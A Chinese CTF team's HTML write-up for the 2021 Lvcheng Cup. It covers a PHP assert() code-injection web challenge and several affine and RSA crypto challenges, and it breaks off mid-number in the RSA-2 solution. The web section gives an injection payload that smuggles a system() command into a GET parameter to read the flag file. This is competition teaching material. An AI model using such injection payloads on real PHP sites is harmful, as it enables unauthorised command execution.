<!doctype html>
<html lang="zh"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>2021绿城杯wp - n03tAck</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="n03tAck"><meta name="msapplication-TileImage" content="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/E595997D44EF7013BFD08323A4506527.png"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="n03tAck"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="2021首届绿城杯wp"><meta property="og:type" content="blog"><meta property="og:title" content="n03tAck"><meta property="og:url" content="https://wp.n03tack.top/"><meta property="og:site_name" content="n03tAck"><meta property="og:description" content="2021首届绿城杯wp"><meta property="og:locale" content="zh_CN"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%BB%BF%E5%9F%8E%E6%9D%AF/image/image-20210929194537655.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%BB%BF%E5%9F%8E%E6%9D%AF/image/image-20210929195427246.png"><meta property="og:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%BB%BF%E5%9F%8E%E6%9D%AF/image/image-20210929181718979.png"><meta property="og:image" content="https://i.loli.net/2021/09/29/PiNwMYOFXLHadZQ.png"><meta property="og:image" content="https://i.loli.net/2021/09/29/IWLsxokKbfScG3V.png"><meta property="og:image" content="https://i.loli.net/2021/09/29/tmYNM1f8AP34Jar.png"><meta property="og:image" content="https://i.loli.net/2021/09/29/JxfPyDNlZMY8HXA.png"><meta property="og:image" content="https://i.loli.net/2021/09/29/4R1pOiyYjNTDb2A.png"><meta property="og:image" content="https://i.loli.net/2021/09/29/mk9I4PYOT6sR8bC.png"><meta property="og:image" content="https://i.loli.net/2021/09/29/4NkrmxGQL6A1yne.png"><meta property="og:image" content="https://i.loli.net/2021/09/29/RFuBkpqt8DZ3JyE.png"><meta property="og:image" content="https://i.loli.net/2021/09/29/F5p9C6Tw32mIJMu.png"><meta property="article:published_time" content="2021-09-30T04:23:00.000Z"><meta property="article:modified_time" content="2021-09-30T04:49:51.873Z"><meta property="article:author" content="n03tAck"><meta property="twitter:card" content="summary"><meta property="twitter:image" content="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%BB%BF%E5%9F%8E%E6%9D%AF/image/image-20210929194537655.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"https://wp.n03tack.top/posts/47585/"},"headline":"n03tAck","image":["https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%BB%BF%E5%9F%8E%E6%9D%AF/image/image-20210929194537655.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%BB%BF%E5%9F%8E%E6%9D%AF/image/image-20210929195427246.png","https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%BB%BF%E5%9F%8E%E6%9D%AF/image/image-20210929181718979.png","https://i.loli.net/2021/09/29/PiNwMYOFXLHadZQ.png","https://i.loli.net/2021/09/29/IWLsxokKbfScG3V.png","https://i.loli.net/2021/09/29/tmYNM1f8AP34Jar.png","https://i.loli.net/2021/09/29/JxfPyDNlZMY8HXA.png","https://i.loli.net/2021/09/29/4R1pOiyYjNTDb2A.png","https://i.loli.net/2021/09/29/mk9I4PYOT6sR8bC.png","https://i.loli.net/2021/09/29/4NkrmxGQL6A1yne.png","https://i.loli.net/2021/09/29/RFuBkpqt8DZ3JyE.png","https://i.loli.net/2021/09/29/F5p9C6Tw32mIJMu.png"],"datePublished":"2021-09-30T04:23:00.000Z","dateModified":"2021-09-30T04:49:51.873Z","author":{"@type":"Person","name":"n03tAck"},"description":"2021首届绿城杯wp"}</script><link rel="canonical" href="https://wp.n03tack.top/posts/47585/"><link rel="icon" href="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/E595997D44EF7013BFD08323A4506527.png"><meta name="referrer" content="no-referrer-when-downgrade"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/highlight.js/9.12.0/styles/vs2015.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link rel="stylesheet" href="/css/default.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/font-awesome/5.12.0/css/all.min.css"><link rel="stylesheet" href="https://fonts.loli.net/css?family=Ubuntu:400,600|Source+Code+Pro|Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic|Microsoft YaHei:300,300italic,400,400italic,700,700italic|PT Mono:300,300italic,400,400italic,700,700italic&amp;amp;subset=latin,latin-ext|Inconsolata|Itim|Lobster.css"><script src="https://cdnjs.loli.net/ajax/libs/jquery/3.3.1/jquery.min.js"></script><script src="/js/globalUtils.js"></script><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" defer></script><!--!--><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdnjs.loli.net/ajax/libs/justifiedGallery/3.7.0/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><script src="https://cdnjs.loli.net/ajax/libs/pace/1.0.2/pace.min.js"></script><meta name="generator" content="Hexo 5.4.0"></head><body class="is-3-column has-navbar-fixed-top"><nav class="navbar navbar-main is-fixed-top"><div class="container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="https://cdn.jsdelivr.net/gh/dota-st/blog_file@master/E595997D44EF7013BFD08323A4506527.png" alt="n03tAck" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">首页</a><a class="navbar-item" href="/archives">归档</a><a class="navbar-item" href="/categories">分类</a><a class="navbar-item" href="/tags">标签</a><a class="navbar-item" href="/about">关于</a><a class="navbar-item" href="/friend">战队成员</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Join Gitter" href="https://github.com/dota-st"><i class="fab fa-gitter"></i></a><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/dota-st"><i class="fab fa-github"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="目录" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="搜索" href="javascript:;"><i class="fas fa-search"></i></a><a class="navbar-item" id="night-nav" title="Night Mode" href="javascript:;"><i class="fas fa-moon" id="night-icon"></i></a></div></div></div></nav><script type="text/javascript" src="/js/theme-setting.js"></script><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><!--!--><div class="card"><article class="card-content article" role="article"><div class="article-meta size-small is-uppercase level is-mobile"><div class="level-left"><i class="far fa-calendar-plus"> </i>2021-09-30  <a class="commentCountImg" href="/posts/47585/#comment-container"><span class="display-none-class">/posts/47585/</span><i class="far fa-comment-dots"></i> <span class="commentCount" id="7f7b4190156dab3f33baf851c72771a7">99+</span>  </a><span class="level-item"><i class="far fa-clock"> </i>15 分钟  <i class="fas fa-pencil-alt"> </i>2.3 k</span><span class="level-item" id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span>次访问</span></div></div><h1 class="title is-3 is-size-4-mobile">2021绿城杯wp</h1><div class="content"><blockquote>
<p>2021首届绿城杯wp</p>
<span id="more"></span>
</blockquote>
<h2 id="成绩"><a href="#成绩" class="headerlink" title="成绩"></a>成绩</h2><p>等官方ban人再贴，一秒解rsa的“大佬”是真的np</p>
<h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="ez-php"><a href="#ez-php" class="headerlink" title="ez_php"></a>ez_php</h3><p>原题，没啥好说的，网站提示git泄露，用<code>dumpall</code>获取源代码<br><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%BB%BF%E5%9F%8E%E6%9D%AF/image/image-20210929194537655.png"><br>关键代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;link_page&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$link_page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;link_page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$link_page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$page_file</span> = <span class="string">&quot;pages/&quot;</span> . <span class="variable">$link_page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$safe_check1</span> = <span class="string">&quot;strpos(&#x27;<span class="subst">$page_file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>;</span><br><span class="line">assert(<span class="variable">$safe_check1</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// safe!</span></span><br><span class="line"><span class="variable">$safe_check2</span> = <span class="string">&quot;file_exists(&#x27;<span class="subst">$page_file</span>&#x27;)&quot;</span>;</span><br><span class="line">assert(<span class="variable">$safe_check2</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;no this file!&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先<code>assert</code>可以命令执行，也就是我们只需要构造闭合<code>file_exists</code>即可，然后注释后面的语句，payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;) or system(&#x27;cat pages/flag.php&#x27;);//</span><br></pre></td></tr></table></figure>

<p>在bp里需要url编码<br><img src="https://n03tack-wp-1302856486.file.myqcloud.com/2021%E7%BB%BF%E5%9F%8E%E6%9D%AF/image/image-20210929195427246.png"></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="warmup-加密算法"><a href="#warmup-加密算法" class="headerlink" title="[warmup]加密算法"></a>[warmup]加密算法</h3><p>题目：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>]==<span class="string">&#x27;flag&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line">str1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">plain_text, a, b, m</span>):</span></span><br><span class="line">	cipher_text = <span class="string">&#x27;&#x27;</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> plain_text:</span><br><span class="line">		<span class="keyword">if</span> i <span class="keyword">in</span> str1:</span><br><span class="line">			addr = str1.find(i)</span><br><span class="line">			cipher_text += str1[(a*addr+b) % m]</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			cipher_text += i</span><br><span class="line">	<span class="built_in">print</span>(cipher_text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">encode(flag,<span class="number">37</span>,<span class="number">23</span>,<span class="number">52</span>)</span><br><span class="line"><span class="comment"># cipher_text = &#x27;aoxL&#123;XaaHKP_tHgwpc_hN_ToXnnht&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>仿射，爆破就完事</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">str1 = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encode</span>(<span class="params">plain_text, a, b, m</span>):</span></span><br><span class="line">    cipher_text = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain_text)):</span><br><span class="line">        <span class="keyword">if</span> plain_text[i] <span class="keyword">in</span> str1:</span><br><span class="line">            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">                <span class="keyword">if</span> str1[(a*j+b) % m] == plain_text[i]:</span><br><span class="line">                    cipher_text += str1[j]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            cipher_text += plain_text[i]</span><br><span class="line">    <span class="built_in">print</span>(cipher_text)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;aoxL&#123;XaaHKP_tHgwpc_hN_ToXnnht&#125;&#x27;</span></span><br><span class="line">encode(flag,<span class="number">37</span>,<span class="number">23</span>,<span class="number">52</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>flag{AffInE_CIpheR_iS_clAssiC}</p>
</blockquote>
<h3 id="RSA-1"><a href="#RSA-1" class="headerlink" title="RSA-1"></a>RSA-1</h3><p>题目</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>]==<span class="string">b&#x27;flag&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = getPrime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>,n)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">M = <span class="number">2021</span> * m * <span class="number">1001</span> * p </span><br><span class="line">c = <span class="built_in">pow</span>(M,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>,c)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n = 17365231154926348364478276872558492775911760603002394353723603461898405740234715001820111548600914907617003806652492391686710256274156677887101997175692277729648456087534987616743724646598234466094779540729413583826355145277980479040157075453694250572316638348121571218759769533738721506811175866990851972838466307594226293836934116659685215775643285465895317755892754473332034234495795936183610569571016400535362762699517686781602302045048532131426035260878979892169441059467623523060569285570577199236309888155833013721997933960457784653262076135561769838704166810384309655788983073376941843467117256002645962737847</span></span><br><span class="line"><span class="comment">#c = 6944967108815437735428941286784119403138319713455732155925055928646536962597672941805831312130689338014913452081296400272862710447207265099750401657828165836013122848656839100854719965188680097375491193249127725599660383746827031803066026497989298856420216250206035068180963797454792151191071433645946245914916732637007117085199442894495667455544517483404006536607121480678688000420422281380539368519807162175099763891988648117937777951069899975260190018995834904541447562718307433906592021226666885638877020304005614450763081337082838608414756162253825697420493509914578546951634127502393647068722995363753321912676</span></span><br></pre></td></tr></table></figure>

<p>$a = 2021\times1001$<br>$(apm)^{65537}$ %n=c，则c ≡ 0 % p，可得 c = kp，由此 <code>p＝gcd(n,c)</code>，后面就常规RSA</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">n = <span class="number">17365231154926348364478276872558492775911760603002394353723603461898405740234715001820111548600914907617003806652492391686710256274156677887101997175692277729648456087534987616743724646598234466094779540729413583826355145277980479040157075453694250572316638348121571218759769533738721506811175866990851972838466307594226293836934116659685215775643285465895317755892754473332034234495795936183610569571016400535362762699517686781602302045048532131426035260878979892169441059467623523060569285570577199236309888155833013721997933960457784653262076135561769838704166810384309655788983073376941843467117256002645962737847</span></span><br><span class="line">c = <span class="number">6944967108815437735428941286784119403138319713455732155925055928646536962597672941805831312130689338014913452081296400272862710447207265099750401657828165836013122848656839100854719965188680097375491193249127725599660383746827031803066026497989298856420216250206035068180963797454792151191071433645946245914916732637007117085199442894495667455544517483404006536607121480678688000420422281380539368519807162175099763891988648117937777951069899975260190018995834904541447562718307433906592021226666885638877020304005614450763081337082838608414756162253825697420493509914578546951634127502393647068722995363753321912676</span></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">p = gcd(n,c)</span><br><span class="line">q = n//p</span><br><span class="line">phi = (q-<span class="number">1</span>)*(p-<span class="number">1</span>)</span><br><span class="line">d = invert(e,phi)</span><br><span class="line">M = powmod(c,d,n)</span><br><span class="line">m = <span class="built_in">int</span>(M // (<span class="number">2021</span>*p*<span class="number">1001</span>))</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;Math_1s_1nterest1ng_hah&#125;</span><br></pre></td></tr></table></figure>

<h3 id="RSA-2"><a href="#RSA-2" class="headerlink" title="RSA-2"></a>RSA-2</h3><p>题目</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">assert</span> flag[:<span class="number">5</span>]==<span class="string">b&#x27;flag&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line">m1 = bytes_to_long(flag[:<span class="number">20</span>])</span><br><span class="line">p  = getPrime(<span class="number">512</span>)</span><br><span class="line">p1 = gmpy2.next_prime(p)</span><br><span class="line">q  = getPrime(<span class="number">512</span>)</span><br><span class="line">q1 = gmpy2.next_prime(q)</span><br><span class="line">n1 = p*q*p1*q1</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n1 =&#x27;</span>,n1)</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">c1 = <span class="built_in">pow</span>(m1,e,n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c1 =&#x27;</span>,c1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m2 = bytes_to_long(flag[<span class="number">20</span>:])</span><br><span class="line">p2 = getPrime(<span class="number">1024</span>)</span><br><span class="line">q2 = getPrime(<span class="number">1024</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p2+q2 =&#x27;</span>,p2+q2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q2*q2 =&#x27;</span>,p2*q2)</span><br><span class="line">n2 = p2*p2*q2*q2*q2</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n2 =&#x27;</span>,n2)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2,e,n2)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c2 =&#x27;</span>,c2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n1 = 6348779979606280884589422188738902470575876294643492831465947360363568026280963989291591157710389629216109615274754718329987990551836115660879103234129921943824061416396264358110216047994331119920503431491509529604742468032906950984256964560405062345280120526771439940278606226153077959057882262745273394986607004406770035459301695806378598890589432538916219821477777021460189140081521779103226953544426441823244765828342973086422949017937701261348963541035128661464068769033772390320426795044617751909787914185985911277628404632533530390761257251552073493697518547350246993679844132297414094727147161169548160586911</span></span><br><span class="line"><span class="comment">#c1 = 6201882078995455673376327652982610102807874783073703018551044780440620679217833227711395689114659144506630609087600915116940111002026241056808189658969089532597757995423694966667948250438579639890580690392400661711864264184444018345499567505424672090632235109624193289954785503512742400960515331371813467034511130432319427185134018830006918682733848618201088649690422818940385123599468595766345668931882249779415788129316594083269412221804774856038796248038700275509397599351533280014908894068141056694660319816046357462684688942519849441237878018480036145051967731081582598773076490918572392784684372694103015244826</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p2+q2 = 274773146761138462708137582309097386437793891793691383033856524303010811294101933454824485010521468914846151819876043508541879637544444256520741418495479393777132830985856522008561088410862815913292288683761657919121930016956916865849261153721097671315883469348972925757078089715102032241818526925988645578778</span></span><br><span class="line"><span class="comment">#q2*q2 = 18514724270030962172566965941723224386374076294232652258701085781018776172843355920566035157331579524980108190739141959926523082142273672741849552475156278397131571360099018592018959785627785130126477982765210498547680367230723634424036009539347854344573537848628061468892166199866227984167843139793429682559241317072979374002912607549039431398267184818771503468116379618249319324788996321340764624593443106354104274472601170229835219638093242557547840060892527576940077162990069687019966946826210112318408269749294366586682732614372434218768720577917368726530200897558912687470088583774711767599580037663378929000217</span></span><br><span class="line"><span class="comment">#n2 = 40588227045595304080360385041082238507044292731344465815296032905633525556943787610712651675460810768762763493579129831271018141591546207557410817432455139315527674932933085299277599173971912445226532235814580879585317211349524406424200622675880992390782025158621241499693400288031658194434641718026910652327933253877313106112861283314274635124734817398465059373562194694957841264834312640926278890386089611103714990646541470577351599526904458342660444968591197606820361364761648205241041444681145820799054413179462285509661124362074093583494932706249461954240408827087015525507173082129412234486228092002841868365895837463699200959915782767657258729794037776401995309244941171415842403617486719492483671490834562579225506831496881542530519595438932482796867853234159664409420977526102480385193101883785161080269573707156626838551506024455480650224305894501968583442346807126920740779780593650871645915149689424292912611578291912721896864772950410266629045542480009266574096080138709683466489568290569363478444349563498507530805502511051165160827192795520182720802422213364247355775222858214648603034743679187470844212529134374975737510982287957316878179964602394749601431823167982157434890459245394370728942790117156485268116758052636794417268680901420193002289035538753620555488506926366624641291881353268617130968991258983002165300186971963661666476600998389048880565199317280428349802824448329898502788492233381873026217202981921654673840142095839603360666049476100561268336225902504932800605464136192275593886736746497955270280541423593</span></span><br><span class="line"><span class="comment">#c2 = 25591090168544821761746024178724660839590948190451329227481168576490717242294520739865602061082558759751196452117720647426598261568572440942370039702932821941366792140173428488344932203576334292648255551171274828821657097667106792872200082579319963310503721435500623146012954474613150848083425126987554594651797477741828655238243550266972216752593788734836373144363217639612492397228808215205862281278774096317615918854403992620720969173788151215489908812749179861803144937169587452008097008940710091361183942268245271154461872102813602754439939747566507116519362821255724179093051041994730856401493996771276172343313045755916751082693149885922105491818225012844519264933137622929024918619477538521533548551789739698933067212305578480416163609137189891797209277557411169643568540392303036719952140554435338851671440952865151077383220305295001632816442144022437763089133141886924265774247290306669825085862351732336395617276100374237159580759999593028756939354840677333467281632435767033150052439262501059299035212928041546259933118564251119588970009016873855478556588250138969938599988198494567241172399453741709840486953189764289118312870580993115636710724139809708256360212728127786394411676427828431569046279687481368215137561500777480380501551616577832499521295655237360184159889151837766353116185320317774645294201044772828099074917077896631909654671612557207653830344897644115936322128351494551004652981550758791285434809816872381900401440743578104582305215488888563166054568802145921399726673752722820646807494657299104190123945675647</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这道题分两部分，第一部分是祥云杯2020的RSAssss原题，直接套脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#part 1</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">n = <span class="number">6348779979606280884589422188738902470575876294643492831465947360363568026280963989291591157710389629216109615274754718329987990551836115660879103234129921943824061416396264358110216047994331119920503431491509529604742468032906950984256964560405062345280120526771439940278606226153077959057882262745273394986607004406770035459301695806378598890589432538916219821477777021460189140081521779103226953544426441823244765828342973086422949017937701261348963541035128661464068769033772390320426795044617751909787914185985911277628404632533530390761257251552073493697518547350246993679844132297414094727147161169548160586911</span></span><br><span class="line">c = <span class="number">6201882078995455673376327652982610102807874783073703018551044780440620679217833227711395689114659144506630609087600915116940111002026241056808189658969089532597757995423694966667948250438579639890580690392400661711864264184444018345499567505424672090632235109624193289954785503512742400960515331371813467034511130432319427185134018830006918682733848618201088649690422818940385123599468595766345668931882249779415788129316594083269412221804774856038796248038700275509397599351533280014908894068141056694660319816046357462684688942519849441237878018480036145051967731081582598773076490918572392784684372694103015244826</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fermat_factorization</span>(<span class="params">n</span>):</span></span><br><span class="line">	factor_list = []</span><br><span class="line">	get_context().precision = <span class="number">2048</span></span><br><span class="line">	x = <span class="built_in">int</span>(sqrt(n))</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		x += <span class="number">1</span></span><br><span class="line">		y2 = x ** <span class="number">2</span> - n</span><br><span class="line">		<span class="keyword">if</span> is_square(y2):</span><br><span class="line">			<span class="comment">#print(&#x27;x = &#x27;,x)</span></span><br><span class="line">			y2 = mpz(y2)</span><br><span class="line">			get_context().precision = <span class="number">2048</span></span><br><span class="line">			y = <span class="built_in">int</span>(sqrt(y2))</span><br><span class="line">			factor_list.append([x+y, x-y])</span><br><span class="line">		<span class="keyword">if</span> <span class="built_in">len</span>(factor_list) == <span class="number">2</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">return</span> factor_list</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">	factor_list = fermat_factorization(n)</span><br><span class="line">	<span class="comment">#print(factor_list)</span></span><br><span class="line">	[X1, Y1] = factor_list[<span class="number">0</span>]</span><br><span class="line">	[X2, Y2] = factor_list[<span class="number">1</span>]</span><br><span class="line">	<span class="keyword">assert</span> X1 * Y1 == n</span><br><span class="line">	<span class="keyword">assert</span> X2 * Y2 == n</span><br><span class="line">	p1 = gcd(X1, X2)</span><br><span class="line">	q1 = X1 // p1</span><br><span class="line">	p2 = gcd(Y1, Y2)</span><br><span class="line">	q2 = Y1 // p2</span><br><span class="line">	<span class="comment">#print(&#x27;p1 =&#x27;,p1)</span></span><br><span class="line">	<span class="comment">#print(&#x27;p2 =&#x27;,p2)</span></span><br><span class="line">	<span class="comment">#print(&#x27;q1 =&#x27;,q1)</span></span><br><span class="line">	<span class="comment">#print(&#x27;q2 =&#x27;,q2)</span></span><br><span class="line"></span><br><span class="line">	phi = (p1 - <span class="number">1</span>) * (q1 - <span class="number">1</span>) * (p2 - <span class="number">1</span>) * (q2 - <span class="number">1</span>)</span><br><span class="line">	d = inverse(e, phi)</span><br><span class="line">	flag = long_to_bytes(<span class="built_in">pow</span>(c, d, n))</span><br><span class="line">	<span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>

<p>第二部分是解方程，如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> sympy <span class="keyword">import</span> *</span><br><span class="line">q = Symbol(<span class="string">&#x27;q&#x27;</span>)</span><br><span class="line">p = Symbol(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(solve([p+q - <span class="number">274773146761138462708137582309097386437793891793691383033856524303010811294101933454824485010521468914846151819876043508541879637544444256520741418495479393777132830985856522008561088410862815913292288683761657919121930016956916865849261153721097671315883469348972925757078089715102032241818526925988645578778</span>,p*q - <span class="number">18514724270030962172566965941723224386374076294232652258701085781018776172843355920566035157331579524980108190739141959926523082142273672741849552475156278397131571360099018592018959785627785130126477982765210498547680367230723634424036009539347854344573537848628061468892166199866227984167843139793429682559241317072979374002912607549039431398267184818771503468116379618249319324788996321340764624593443106354104274472601170229835219638093242557547840060892527576940077162990069687019966946826210112318408269749294366586682732614372434218768720577917368726530200897558912687470088583774711767599580037663378929000217</span>],[p,q]))</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">e = <span class="number">0x10001</span></span><br><span class="line">q2 = <span class="number">118403784459455138582919377906131738592946190895354489225890530955489713357948723774385902598164582767355529878101682058998518634444589192617157682795489868846289962039288493883412519273541770945888153150197763095564026103787571812611196732248676365740482179339301570536662025044058993433932899960459852671737</span></span><br><span class="line">p2 = <span class="number">156369362301683324125218204402965647844847700898336893807965993347521097936153209680438582412356886147490621941774361449543361003099855063903583735699989524930842868946568028125148569137321044967404135533563894823557903913169345053238064421472421305575401290009671355220416064671043038807885626965528792907041</span></span><br><span class="line">n2 = p2*p2*q2*q2*q2</span><br><span class="line">c2 = <span class="number">25591090168544821761746024178724660839590948190451329227481168576490717242294520739865602061082558759751196452117720647426598261568572440942370039702932821941366792140173428488344932203576334292648255551171274828821657097667106792872200082579319963310503721435500623146012954474613150848083425126987554594651797477741828655238243550266972216752593788734836373144363217639612492397228808215205862281278774096317615918854403992620720969173788151215489908812749179861803144937169587452008097008940710091361183942268245271154461872102813602754439939747566507116519362821255724179093051041994730856401493996771276172343313045755916751082693149885922105491818225012844519264933137622929024918619477538521533548551789739698933067212305578480416163609137189891797209277557411169643568540392303036719952140554435338851671440952865151077383220305295001632816442144022437763089133141886924265774247290306669825085862351732336395617276100374237159580759999593028756939354840677333467281632435767033150052439262501059299035212928041546259933118564251119588970009016873855478556588250138969938599988198494567241172399453741709840486953189764289118312870580993115636710724139809708256360212728127786394411676427828431569046279687481368215137561500777480380501551616577832499521295655237360184159889151837766353116185320317774645294201044772828099074917077896631909654671612557207653830344897644115936322128351494551004652981550758791285434809816872381900401440743578104582305215488888563166054